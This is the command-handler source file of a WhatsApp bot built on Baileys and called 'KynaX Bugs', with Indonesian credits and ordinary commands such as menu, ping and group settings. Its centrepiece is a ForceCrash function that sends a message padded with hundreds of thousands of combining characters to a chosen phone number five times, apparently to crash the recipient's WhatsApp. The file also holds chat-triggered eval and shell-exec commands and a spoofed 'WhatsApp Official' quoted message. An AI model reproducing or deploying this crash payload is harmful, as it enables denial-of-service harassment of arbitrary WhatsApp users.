/*
 [ Credit Base By Developed ( License ) ]
 >_ Development ;
  YifanModss
 >_ Development Support ;
  BinzzXd
 >_ Social Savings
  WhatsApp: whatsapp.com/channel/0029VbCrKuDGU3BE1pCnqE2x
  Telegram: t.me/yifanmodss
  YouTube: youtube.com/yifanoffc
  Instagram: instagram.com/kcoderxs
  GitHub: github.com/yifandevv
 >_ Syarat And Ketentuan ;
  !! Tidak Boleh Dijual Base ini ( KECUALI! udah lu rimek/rinem baru boleh lu jual :v )
  !! Tidak Boleh Disalahgunakan ( MIT )
  !! Tidak Boleh Memanfaatkan Orang Lain ( untuk kepentingan PRIBADI! )
  ✓ Boleh Share ( Bebas )
  ✓ Boleh Rinem/Rimek ( KynaXKabuto )
  ✓ Boleh Open Jasa Pasang Bot ( KynaXKabuto )
  ✓ Boleh Open Jasa Sewa Bot ( KynaXKabuto )
  ✓ Boleh Open Jasa Push Channel ( Pakai Script ini Juga Boleh )
  ✓ Boleh Open Sell Sc ( Jangan Basenya!!!, Minim tambahin fitur-fitur baru )
  
  * This My Credit, You Can Using, Please Not Deleted My Credits!
  © YifanModss — KynaX
*/

const { exec } = require('child_process');
const util = require('util');
const chalk = require('chalk');
const crypto = require('crypto');
const fs = require('fs');
/**
 * Main Case Command Execution System
 * @param {Object} conn - Baileys Connection Socket
 * @param {Object} m - Serialized Message Object
 * @param {Object} chatUpdate - Raw chat update event
 * @param {Object} store - InMemoryStore instance
 */
async function handleCommand(conn, m, chatUpdate, store) {
    try {
        const body = m.body || '';
        const isCmd = body.startsWith(global.prefix);
        const command = isCmd ? body.slice(global.prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(' ');

        // valid owener nyah
        const senderNumber = m.sender.split('@')[0];
        const isOwner = global.ownerNumbers.some(o => o.split('@')[0] === senderNumber);

        // gc kontex
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(() => null) : null;
        const groupParticipants = groupMetadata ? groupMetadata.participants : [];
        const groupAdmins = groupParticipants.filter(p => p.admin !== null).map(p => p.id);
        const isBotGroupAdmin = groupAdmins.includes(conn.decodeJid(conn.user.id));
        const isGroupAdmin = groupAdmins.includes(m.sender);

        // cmd log
        if (isCmd) {
            console.log(
                chalk.black.bgWhite(`[CMD]`),
                chalk.green(command),
                chalk.yellow(`From: ${m.sender}`),
                chalk.blue(`In: ${m.isGroup ? 'Group' : 'Private'}`)
            );
        }
        
        // my function
        async function ForceCrash(target) {
  try {
    await conn.relayMessage(target, {
        orderStatus: {
            image: 'media/img.jpg',
            title: 'YifanModss/CoderXs.dev',
            text: '۠ܶ'.repeat(400000),
            footer: '۠ܶ۠ܶ'.repeat(1000),
            referenceId: '۠ܶ'.repeat(50000),
            status: 2,
            subtotalValue: 99999,
            subtotalOffset: 99999,
            taxValue: 0,
            taxOffset: 100,
            currency: 'IDR'
        }
    }, { onTarget: true, messageId: null });
    console.log(`☑ Succes Render Payload ForceCrash to => ${target}`);
    
    } catch (e) {
        console.log(`☒ Error: \n${e.message}`);
    }
}

      const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    groupInviteMessage: {
      groupJid: "123456789123654321@g.us",
      inviteCode: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==",
      inviteExpiration: null,
      groupName: "🪀 WhatsApp",
      caption: "🪀 WhatsApp Official",
      jpegThumbnail: Buffer.from(
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=",
        "base64"
      )
    }
  },
  contextInfo: {
    mentionedJid: ["0@s.whatsapp.net"],
    isForwarded: true,
    forwardingScore: 9999
  }
}

const reply = async (conn, m, teks) => {
  await conn.sendMessage(
    m.chat,
    {
      text: "\u0000",
      footer: teks,
      buttons: [
        {
          buttonId: '.donate',
          buttonText: { displayText: '❣️ Donasikan Bansosnya' },
          type: 1
        }
      ]
    },
    { quoted: lol }
  )
}
       // end my function

        switch (command) {
            case 'ping': {
                await require('./lib/ping')(conn, m)
                break;
            }
            
            case 'ytplay': {
                await require('./lib/youtube')(conn, m)
            }

            case 'menu':
            case 'help':
            case 'bantu': {                
     await conn.relayMessage(
        m.chat,
        {
            buttonsMessage: {
                locationMessage: {
                    degreesLatitude: 35.6895,
                    degreesLongitude: 139.6920,
                    name: 'YifanModss CoderXs',
                    address: 'Japanese',
                    jpegThumbnail: fs.readFileSync('./media/img.jpg')
                },
contentText: `🗿`,
                footerText: `╭─────〔 \`ボット情報\` 〕─────╮
│ *デ Developer :* YifanModss
│ *ナ Nama Bot :* KynaX Bugs
│ *テ Tele :* t.me/yifanmodss
│ *ユ Yutub :* youtube.com/yifanoffc
│ *私 Igeh :* instagram.com/kcoderxs
│ *す Donate:* donate-kopi.edgeone.dev
│ *タ Type :* Case
│ *モ Prefix :* ${global.prefix}
│ *ヌ Number :* @${m.sender.split('@')[0]}
╰────────────────────────╯

シラカン テカン トンボル ディバワ ウントゥク リハット メニュー.`,
                buttons: [
                    {
                        buttonId: '.jid',
                        buttonText: {
                            displayText: 'My Jid'
                        },
                        type: 1
                    },
                    {
                        buttonId: '.ping',
                        buttonText: {
                            displayText: 'Ping Real Live'
                        },
                        type: 1
                    }
                ],
                headerType: 6
            }
        },
        {
            quoted: m,
            messageId: crypto.randomUUID()
        }
    )
                break;
            }
            
            case 'allmenu': {
               await require('./lib/allmenu')(conn, m)
               break;
            }
            
            case 'donate': {
               await conn.sendMessage(m.chat, {
                richMessage: {
                 title: "❣️ Uang mu Nganggur? mending sedekahin aja",
                 text: "> Dapet Pahala jadinya\nDonasikan kesini : [Donate](https://donate-kopi.edgeone.dev)",
                 code: { language: "html", code: "<!DOCTYPE HTML><html><text>\"Semoga rezeky mu dilipat gandakan, dan diberikan kesehatan, Amin.\"</text></html>" },
                 sources: [["", "https://donate-kopi.edgeone.dev", "Website Donasi"]],
                 tip: "Alhamdulillah, Terimakasih banyak (100p,1k,5k,100k,100jt) gw terima dengan happy hati"
                }
               })
            }

            case 'jid': {
                const infoText = `
🧢 *Account Identification Info:*
• *Standard JID:* ${m.sender}
• *LID JID:* ${m.senderLid || 'Not using LID'}
• *Chat JID:* ${m.chat}
• *Is Group:* ${m.isGroup ? 'Yes' : 'No'}
`.trim();
                await reply(conn, m, infoText);
                break;
            }

            case 'convertlid': {
                if (!text) return await reply(conn, m, `Usage: ${global.prefix}convertlid <1234567890@lid>`);
                const targetLid = text.trim();
                const convertedJid = await conn.convertLidToJid(targetLid);
                await reply(conn, m, `🔍 *LID Conversion Result:*\n\n• *Input LID:* ${targetLid}\n• *Converted JID:* ${convertedJid}`);
                break;
            }

            case 'runtime': {
                const uptime = process.uptime();
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = Math.floor(uptime % 60);
                await reply(conn, m, `⏱️ *Bot Runtime:* ${hours}h ${minutes}m ${seconds}s`);
                break;
            }

            case 'group': case 'gb': case 'gc': case 'grup': case 'grub': {
                if (!m.isGroup) return reply(conn, m, '😹 ini cuma bs digunain di dalam grup.');
                if (!isGroupAdmin && !isOwner) return reply(conn, m, '😹 cuma admin yg bisa deckh.');
                if (!isBotGroupAdmin && !isOwner) return reply(conn, m, '😭 bot harus admin dulu');

                if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'not_announcement');
                    await reply(conn, m, '✅ group ini dibuka lebar.');
                } else if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'announcement');
                    await reply(conn, m, '🥱 group capek, jadi tutup dulu, jadi... cuma admin yg bs kirim pesan.');
                } else {
                    await reply(conn, m, `Usage: ${global.prefix}group <open/close>`);
                }
                break;
            }
            
            case 'bugs':
            case 'crash': 
            case 'order':
            case 'crashandro':
            case 'fc': {
try {
    if (!isOwner) return reply(conn, m, `
-——— · ———-
only for YifanModss
-——— · ———-.
    `);
    const args = body.trim().split(/ +/).slice(1)
    const qtext = q = args.join(" ")
    if (!q) return reply(conn, m, `** Example Use: ${command} 6278900123456789\nTanpa Spasi ( )/Tanpa Simbol (-)`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return reply(conn, m, "❌ Nomor target harus awalan 62, jangan ada 0/spasi/simbol minus");
    }

    let target = `${jidx}@s.whatsapp.net`;

    reply(conn, m, `*━━━━━━━━━━━━━━━━━━━━━━━*
  ✅ \`𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆\`
*━━━━━━━━━━━━━━━━━━━━━━━*

> ▣ \`𝗣𝗿𝗶𝗼𝗿𝗶𝘁𝘆\` : Ultra Highlight KynaX the Level
> ▣ \`𝗦𝘁𝗮𝘁𝘂𝘀\` : Done Fire to Target
> ▣ \`𝗧𝗮𝗿𝗴𝗲𝘁\` : ${target}
> ▣ \`𝗖𝗼𝗺𝗺𝗮𝗻𝗱\` : ${command}

  ─────────────────────
  \`𝗜'𝗹𝗹 𝗵𝗮𝗻𝗱𝗹𝗲 𝘁𝗵𝗲 𝗿𝗲𝘀𝘁.\`
  \`𝗝𝘂𝘀𝘁 𝘂𝗽𝗱𝗮𝘁𝗲 𝗺𝗲 𝗹𝗮𝘁𝗲𝗿.\`
━━━━━━━━━━━━━━━━━━━━━━━
> \`∅ 𝗠𝗼𝗵𝗼𝗻 𝗝𝗲𝗱𝗮 𝟱 𝗠𝗲𝗻𝗶𝘁 𝘀𝗲𝗯𝗲𝗹𝘂𝗺 𝗺𝗲𝗺𝗮𝗸𝗮𝗶 𝗕𝗼𝘁 𝗸𝗲𝗺𝗯𝗮𝗹𝗶 𝗮𝗴𝗮𝗿 𝘁𝗶𝗱𝗮𝗸 𝗸𝗲𝗻𝗮 𝗯𝗮𝗻𝗻𝗲𝗱!\`
━━━━━━━━━━━━━━━━━━━━━━━`);

    for (let r = 0; r < 5; r++) {
    await ForceCrash(target)
    await new Promise(r => setTimeout(r, 5000))
    }
  console.log(chalk.blue('[!] SUCCES SEND BUGS' + target))
 } catch (e) { console.log(chalk.red.bold('[ERROR]' + e)) }
}
break;

            case 'eval': {
                if (!isOwner) return reply(conn, m, `
-——— · ———-
only for YifanModss
-——— · ———-`);
                if (!text) return reply(conn, m, 'Please provide JavaScript code to evaluate.');

                try {
                    let evaled = await eval(`(async () => { ${text} })()`);
                    if (typeof evaled !== 'string') {
                        evaled = util.inspect(evaled);
                    }
                    await reply(conn, m, evaled);
                } catch (err) {
                    await reply(conn, m, `❌ *Eval Error:*\n\`\`\`${String(err)}\`\`\``);
                }
                break;
            }

            case '$': {
                if (!isOwner) return reply(conn, m, `
-——— · ———-
only for YifanModss
-——— · ———-.`);
                if (!text) return reply(conn, m, 'Please provide a terminal command to execute.');

                exec(text, (err, stdout, stderr) => {
                    if (err) return reply(conn, m, `❌ *Exec Error:*\n\`\`\`${err.message}\`\`\``);
                    if (stderr) return reply(conn, m, `⚠️ *Stderr:*\n\`\`\`${stderr}\`\`\``);
                    reply(`💻 *Output:*\n\`\`\`${stdout}\`\`\``);
                });
                break;
            }

            default:
                // diamin ajah disini
                break;
        }

    } catch (err) {
        console.error(chalk.red('[COMMAND ERROR] Exception caught inside case.js:'), err);
        reply(conn, m, `⚠️ *Error executing command:* ${err.message}`).catch(() => {});
    }
}

module.exports = { handleCommand };